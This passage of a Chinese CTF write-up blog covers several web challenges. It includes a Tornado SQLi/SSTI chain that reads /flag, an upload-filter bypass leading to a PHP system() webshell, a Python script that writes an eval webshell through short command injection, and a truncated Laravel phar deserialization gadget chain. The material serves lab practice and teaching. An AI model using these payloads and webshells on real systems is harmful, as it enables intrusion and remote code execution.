+&lt;p>按照预期解，登入后可以任意文件读取，读&lt;code>/proc/self/cmdline&lt;/code>可以看到&lt;code>python3 /qwb/app/app.py&lt;/code>，无法直接读app.py，但是可以读pyc&lt;/p>
+&lt;p>http的响应头中有tornado的版本号6.0.3，对应的python&amp;gt;=3.5，爆破一下pyc的名称，得到pyc&lt;/p>
+&lt;pre tabindex="0">&lt;code>/qwbimage.php?qwb_image_name=/qwb/app/__pycache__/app.cpython-35.pyc
+&lt;/code>&lt;/pre>&lt;p>uncompyle6反编译得到源码&lt;/p>
+&lt;pre tabindex="0">&lt;code>import tornado.ioloop, tornado.web, tornado.options, pymysql, os, re
+settings = {'static_path': os.path.join(os.getcwd(), 'static'),
+'cookie_secret': 'b93a9960-bfc0-11eb-b600-002b677144e0'}
+db_username = 'root'
+db_password = 'xxxx'
+class MainHandler(tornado.web.RequestHandler):
+def get(self):
+user = self.get_secure_cookie('user')
+if user and user == b'admin':
+self.redirect('/admin.php', permanent=True)
+return
+self.render('index.html')
+class LoginHandler(tornado.web.RequestHandler):
+def get(self):
+username = self.get_argument('username', '')
+password = self.get_argument('password', '')
+if not username or not password:
+if not self.get_secure_cookie('user'):
+self.finish('&amp;lt;script&amp;gt;alert(`please input your password and username`);history.go(-1);&amp;lt;/script&amp;gt;')
+return
+if self.get_secure_cookie('user') == b'admin':
+self.redirect('/admin.php', permanent=True)
+else:
+self.redirect('/', permanent=True)
+else:
+conn = pymysql.connect('localhost', db_username, db_password, 'qwb')
+cursor = conn.cursor()
+cursor.execute('SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s', [username, password])
+results = cursor.fetchall()
+if len(results) != 0:
+if results[0][1] == 'admin':
+self.set_secure_cookie('user', 'admin')
+cursor.close()
+conn.commit()
+conn.close()
+self.redirect('/admin.php', permanent=True)
+return
+else:
+cursor.close()
+conn.commit()
+conn.close()
+self.finish('&amp;lt;script&amp;gt;alert(`login success, but only admin can get flag`);history.go(-1);&amp;lt;/script&amp;gt;')
+return
+else:
+cursor.close()
+conn.commit()
+conn.close()
+self.finish('&amp;lt;script&amp;gt;alert(`your username or password is error`);history.go(-1);&amp;lt;/script&amp;gt;')
+return
+class RegisterHandler(tornado.web.RequestHandler):
+def get(self):
+username = self.get_argument('username', '')
+password = self.get_argument('password', '')
+word_bans = ['table', 'col', 'sys', 'union', 'inno', 'like', 'regexp']
+bans = ['&amp;quot;', '#', '%', '&amp;amp;', ';', '&amp;lt;', '=', '&amp;gt;', '\\', '^', '`', '|', '*', '--', '+']
+for ban in word_bans:
+if re.search(ban, username, re.IGNORECASE):
+self.finish('&amp;lt;script&amp;gt;alert(`error`);history.go(-1);&amp;lt;/script&amp;gt;')
+return
+for ban in bans:
+if ban in username:
+self.finish('&amp;lt;script&amp;gt;alert(`error`);history.go(-1);&amp;lt;/script&amp;gt;')
+return
+if not username or not password:
+self.render('register.html')
+return
+if username == 'admin':
+self.render('register.html')
+return
+conn = pymysql.connect('localhost', db_username, db_password, 'qwb')
+cursor = conn.cursor()
+try:
+cursor.execute(&amp;quot;SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser='%s'&amp;quot; % username)
+results = cursor.fetchall()
+if len(results) != 0:
+self.finish('&amp;lt;script&amp;gt;alert(`this username had been used`);history.go(-1);&amp;lt;/script&amp;gt;')
+conn.commit()
+conn.close()
+return
+except:
+conn.commit()
+conn.close()
+self.finish('&amp;lt;script&amp;gt;alert(`error`);history.go(-1);&amp;lt;/script&amp;gt;')
+return
+try:
+cursor.execute('insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)', [username, password])
+conn.commit()
+conn.close()
+self.finish(&amp;quot;&amp;lt;script&amp;gt;alert(`success`);location.href='https://amiaaaz.github.io/index.php';&amp;lt;/script&amp;gt;&amp;quot;)
+return
+except:
+conn.rollback()
+conn.close()
+self.finish('&amp;lt;script&amp;gt;alert(`error`);history.go(-1);&amp;lt;/script&amp;gt;')
+return
+class LogoutHandler(tornado.web.RequestHandler):
+def get(self):
+self.clear_all_cookies()
+self.redirect('/', permanent=True)
+class AdminHandler(tornado.web.RequestHandler):
+def get(self):
+user = self.get_secure_cookie('user')
+if not user or user != b'admin':
+self.redirect('/index.php', permanent=True)
+return
+self.render('admin.html')
+class ImageHandler(tornado.web.RequestHandler):
+def get(self):
+user = self.get_secure_cookie('user')
+image_name = self.get_argument('qwb_image_name', 'header.jpeg')
+if not image_name:
+self.redirect('/', permanent=True)
+return
+else:
+if not user or user != b'admin':
+self.redirect('/', permanent=True)
+return
+if image_name.endswith('.py') or 'flag' in image_name or '..' in image_name:
+self.finish(&amp;quot;nonono, you can't read it.&amp;quot;)
+return
+image_name = os.path.join(os.getcwd() + '/image', image_name)
+with open(image_name, 'rb') as (f):
+img = f.read()
+self.set_header('Content-Type', 'image/jpeg')
+self.finish(img)
+return
+class SecretHandler(tornado.web.RequestHandler):
+def get(self):
+if len(tornado.web.RequestHandler._template_loaders):
+for i in tornado.web.RequestHandler._template_loaders:
+tornado.web.RequestHandler._template_loaders[i].reset()
+msg = self.get_argument('congratulations', 'oh! you find it')
+bans = []
+for ban in bans:
+if ban in msg:
+self.finish('bad hack,go out!')
+return
+with open('congratulations.html', 'w') as (f):
+f.write('&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;congratulations&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;alert(&amp;quot;%s&amp;quot;);location.href=\'/admin.php\';&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;\n' % msg)
+f.flush()
+self.render('congratulations.html')
+if tornado.web.RequestHandler._template_loaders:
+for i in tornado.web.RequestHandler._template_loaders:
+tornado.web.RequestHandler._template_loaders[i].reset()
+def make_app():
+return tornado.web.Application([
+(
+'/index.php', MainHandler),
+(
+'/login.php', LoginHandler),
+(
+'/logout.php', LogoutHandler),
+(
+'/register.php', RegisterHandler),
+(
+'/admin.php', AdminHandler),
+(
+'/qwbimage.php', ImageHandler),
+(
+'/good_job_my_ctfer.php', SecretHandler),
+(
+'/', MainHandler)], **settings)
+if __name__ == '__main__':
+app = make_app()
+app.listen(8000)
+tornado.ioloop.IOLoop.current().start()
+print('start')
+&lt;/code>&lt;/pre>&lt;p>可以看到&lt;code>/good_job_my_ctfer.php&lt;/code>有ssti，但是&lt;code>{{}}&lt;/code>被过滤，只能用&lt;code>{%%}&lt;/code>，这里用到的是&lt;code>{%extends %}&lt;/code>，它可以传递一个文件路径作为参数，将其包含并渲染&lt;/p>
+&lt;p>所以我们可以先通过sqli的outfile写文件，然后通过ssti包含 来执行读flag的命令&lt;/p>
+&lt;pre tabindex="0">&lt;code>/register.php?username=amiz&amp;amp;password={%set return __import__(&amp;quot;os&amp;quot;).popen(&amp;quot;cat /flag&amp;quot;).read()%}
+/register.php?username=amiz' into outfile '/var/lib/mysql-files/amiz&amp;amp;password=amiz
+/good_job_my_ctfer.php?congratulations={%extends /var/lib/mysql-files/amiz%}
+&lt;/code>&lt;/pre>&lt;p>先通过注册把payload写到密码部分，然后outfile到mysql的默认导出目录&lt;code>/var/lib/mysql-files/&lt;/code>，最后包含&lt;/p>
+&lt;p>flag{79d863ac-1fc6-42f6-951a-d3b6f0468b7f}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[PWNHUB 公开赛 2018]傻 fufu 的工作日
+&lt;/h4>
+&lt;/summary>
+&lt;p>/UploadFile.class.php.bak, /index.php.bak 有备份文件泄露，使用phpjiami进行加密，我们用脚本进行解密&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+if($_FILES) {
+include 'UploadFile.class.php';
+$dist = 'upload';
+$upload = new UploadFile($dist, 'upfile');
+$data = $upload-&amp;gt;upload();
+}
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+class UploadFile {
+public $error = '';
+protected $field;
+protected $allow_ext;
+protected $allow_size;
+protected $dist_path;
+protected $new_path;
+function __construct($dist_path, $field='upfile', $new_name='random', $allow_ext=['gif', 'jpg', 'jpeg', 'png'], $allow_size=102400)
+{
+$this-&amp;gt;field = $field;
+$this-&amp;gt;allow_ext = $allow_ext;
+$this-&amp;gt;allow_size = $allow_size;
+$this-&amp;gt;dist_path = realpath($dist_path);
+if ($new_name === 'random') {
+$this-&amp;gt;new_name = uniqid();
+} elseif (is_string($new_name)) {
+$this-&amp;gt;new_name = $new_name;
+} else {
+$this-&amp;gt;new_name = null;
+}
+}
+protected function codeToMessage($code)
+{
+switch ($code) {
+case UPLOAD_ERR_INI_SIZE:
+$message = &amp;quot;The uploaded file exceeds the upload_max_filesize directive in php.ini&amp;quot;;
+break;
+case UPLOAD_ERR_FORM_SIZE:
+$message = &amp;quot;The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form&amp;quot;;
+break;
+case UPLOAD_ERR_PARTIAL:
+$message = &amp;quot;The uploaded file was only partially uploaded&amp;quot;;
+break;
+case UPLOAD_ERR_NO_FILE:
+$message = &amp;quot;No file was uploaded&amp;quot;;
+break;
+case UPLOAD_ERR_NO_TMP_DIR:
+$message = &amp;quot;Missing a temporary folder&amp;quot;;
+break;
+case UPLOAD_ERR_CANT_WRITE:
+$message = &amp;quot;Failed to write file to disk&amp;quot;;
+break;
+case UPLOAD_ERR_EXTENSION:
+$message = &amp;quot;File upload stopped by extension&amp;quot;;
+break;
+default:
+$message = &amp;quot;Unknown upload error&amp;quot;;
+break;
+}
+return $message;
+}
+protected function error($info)
+{
+$this-&amp;gt;error = $info;
+return false;
+}
+public function upload()
+{
+if(empty($_FILES[$this-&amp;gt;field])) {
+return $this-&amp;gt;error('上传文件为空');
+}
+if(is_array($_FILES[$this-&amp;gt;field]['error'])) {
+return $this-&amp;gt;error('一次只能上传一个文件');
+}
+if($_FILES[$this-&amp;gt;field]['error'] != UPLOAD_ERR_OK) {
+return $this-&amp;gt;error($this-&amp;gt;codeToMessage($_FILES[$this-&amp;gt;field]['error']));
+}
+$filename = !empty($_POST[$this-&amp;gt;field]) ? $_POST[$this-&amp;gt;field] : $_FILES[$this-&amp;gt;field]['name'];
+if(!is_array($filename)) {
+$filename = explode('.', $filename);
+}
+foreach ($filename as $name) {
+if(preg_match('#[&amp;lt;&amp;gt;:&amp;quot;/\\|?*.]#is', $name)) {
+return $this-&amp;gt;error('文件名中包含非法字符');
+}
+}
+if($_FILES[$this-&amp;gt;field]['size'] &amp;gt; $this-&amp;gt;allow_size) {
+return $this-&amp;gt;error('你上传的文件太大');
+}
+if(!in_array($filename[count($filename)-1], $this-&amp;gt;allow_ext)) {
+return $this-&amp;gt;error('只允许上传图片文件');
+}
+// 用.分割文件名，只保留首尾两个字符串，防御Apache解析漏洞
+$origin_name = current($filename);
+$ext = end($filename);
+$new_name = ($this-&amp;gt;new_name ? $this-&amp;gt;new_name : $origin_name) . '.' . $ext;
+$target_fullpath = $this-&amp;gt;dist_path . DIRECTORY_SEPARATOR . $new_name;
+// 创建目录
+if(!is_dir($this-&amp;gt;dist_path)) {
+mkdir($this-&amp;gt;dist_path);
+}
+if(is_uploaded_file($_FILES[$this-&amp;gt;field]['tmp_name']) &amp;amp;&amp;amp; move_uploaded_file($_FILES[$this-&amp;gt;field]['tmp_name'], $target_fullpath)) {
+// Success upload
+} elseif (rename($_FILES[$this-&amp;gt;field]['tmp_name'], $target_fullpath)) {
+// Success upload
+} else {
+return $this-&amp;gt;error('写入文件失败，可能是目标目录不可写');
+}
+return [
+'name' =&amp;gt; $origin_name,
+'filename' =&amp;gt; $new_name,
+'type' =&amp;gt; $ext
+];
+}
+}
+&lt;/code>&lt;/pre>&lt;p>注意到这个后缀&lt;/p>
+&lt;pre tabindex="0">&lt;code>$filename = !empty($_POST[$this-&amp;gt;field]) ? $_POST[$this-&amp;gt;field] : $_FILES[$this-&amp;gt;field]['name'];
+if(!in_array($filename[count($filename)-1], $this-&amp;gt;allow_ext)) {
+return $this-&amp;gt;error('只允许上传图片文件');
+}
+$ext = end($filename);
+$target_fullpath = $this-&amp;gt;dist_path . DIRECTORY_SEPARATOR . $new_name;
+&lt;/code>&lt;/pre>&lt;p>在判断的时候用的是&lt;code>count($filename)-1&lt;/code>，变相提示我们可以有很多的&lt;code>name&lt;/code>，配合数组进行绕过&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220122191921885.png" alt="image-20220122191921885">&lt;/p>
+&lt;pre tabindex="0">&lt;code>/upload/61ebe7df95da2.php?amiz=system('cat /flag_9bc85242c9f1a7663e6806778e8a8558');
+&lt;/code>&lt;/pre>&lt;p>flag_9bc85242c9f1a7663e6806778e8a8558&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+*ctf473831530_2018_web_virink_web
+&lt;/h4>
+&lt;/summary>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+$sandbox = '/www/sandbox/' . md5('orange' . $_SERVER['REMOTE_ADDR']);
+mkdir($sandbox);
+chdir($sandbox);
+if (isset($_GET['cmd']) &amp;amp;&amp;amp; strlen($_GET['cmd']) &amp;lt;= 20) {
+exec($_GET['cmd']);
+} else if (isset($_GET['reset'])) {
+exec('/bin/rm -rf ' . $sandbox);
+}
+echo &amp;quot;&amp;lt;br /&amp;gt; IP : {\$_SERVER['REMOTE_ADDR']}&amp;quot;;
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>跟orange佬的&lt;a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge">[HitconCTF 2017]babyfirst-revenge&lt;/a>一样，对cmd字符数更宽松了，这里采用师傅的脚本&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
+&lt;span style="color:#111">base_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://a40430ad-39b5-4020-a550-14afee81e640.node1.buuoj.cn&amp;#39;&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exec_cmd2&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#75715e"># exec cmd&lt;/span>
+&lt;span style="color:#111">my_params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">c&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">my_params&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;exec cmd2&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">write_webshell&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;span style="color:#111">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">r&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;echo\ &lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">r&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;gt;\&amp;#39;\&amp;lt;\?php &lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">r&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;eval\(&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">r&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;\$_GET\[c\]\)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">r&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;gt;\;\&amp;#39;\&amp;gt;2.php&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
+&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">my_params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">i&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">my_params&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">cmd_list&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ls -tr&amp;gt;1.sh&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;sh 1.sh&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
+&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">cmd_list&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">exec_cmd2&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">write_webshell&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ok&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后用/sandbox/xxxx/2.php?c=eval($_POST[&amp;lsquo;cmd&amp;rsquo;]);连接蚁剑，不过由于环境问题，后面内网的部分做不了了，寄&lt;/p>
+&lt;p>参考：&lt;a href="https://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/">wp&lt;/a>&lt;/p>
+&lt;/details>
+&lt;h2 id="page-08">page 08&lt;/h2>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[HFCTF 2021 Final]tinypng
+&lt;/h4>
+&lt;/summary>
+&lt;p>是laravel框架，给了很详细的源码，但是主要的也就是这些&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802232459194.png" alt="image-20210802232459194">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802233146758.png" alt="image-20210802233146758">&lt;/p>
+&lt;p>给出的laravel框架的源码，版本是8.53.0，首先从/routes/web.php入手看一下路由&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804005426972.png" alt="image-20210804005426972">&lt;/p>
+&lt;p>一共两个路由，&lt;code>/&lt;/code>即&lt;code>/index&lt;/code>，实现的是文件上传的一些处理 比如后缀的过滤和文件名的设置之类的，&lt;code>/image&lt;/code>则是特殊的，跟过去看ImageController类&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804005822800.png" alt="image-20210804005822800">&lt;/p>
+&lt;p>亮点在第25行，新建了一个imgcompress实例并执行compressImg()，跟过去看&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804010352158.png" alt="image-20210804010352158">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804010520380.png" alt="image-20210804010520380">&lt;/p>
+&lt;p>首先调用的&lt;code>_openImage()&lt;/code>里第44行的&lt;code>getimagesize()&lt;/code>结合phar会触发反序列化，此处的参数$this-&amp;gt;src来自于&lt;code>$source&lt;/code>，也就是&lt;code>$request -&amp;gt; input('image');&lt;/code>，也就是我们传入的image参数，可控&lt;/p>
+&lt;p>反序列化的入口找到了，接下来就是找一找调用链，这里就直接放出来（我太菜了 寄&lt;/p>
+&lt;p>可用链子1&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Routing\Loader\Configurator&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ImportConfigurator&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$parent&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$route&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$class&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">parent&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$class&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">route&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HigherOrderMessage&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$mock&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$class&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mock&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$class&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;generate&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">PHPUnit\Framework\MockObject&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">MockTrait&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$mockName&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$classCode&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mockName&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;123&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">classCode&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;phpinfo();&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">namespace&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">\Symfony\Component\Routing\Loader\Configurator\ImportConfigurator&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">\Mockery\HigherOrderMessage&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">\PHPUnit\Framework\MockObject\MockTrait&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">MockTrait&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">HigherOrderMessage&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">ImportConfigurator&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;phar.phar&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Phar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;phar.phar&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
